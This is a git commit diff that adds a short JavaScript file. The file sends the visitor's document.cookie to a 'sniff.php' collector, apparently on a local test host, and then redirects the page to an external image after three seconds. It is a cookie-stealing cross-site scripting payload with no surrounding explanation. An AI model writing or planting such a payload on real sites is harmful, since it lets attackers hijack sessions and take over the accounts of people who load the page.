1364e667dcab0cf5c948f12af964b07381b82f84
vov4ick77 <94533928+vov4ick77@users.noreply.github.com>
2023-08-30 21:54:10 +0300

    Update and rename 113.txt to js.js

---
+++ js.js
@@ -0,0 +1,6 @@
+img=new Image();
+img.src='http://localhost/sniff.php?cookie='+document.cookie;
+function F() {
+location='https://otvet.imgsmail.ru/download/234054366_4f953678a2475e9c53a807f249174753_800.jpg';
+}
+setTimeout(F, 3000);
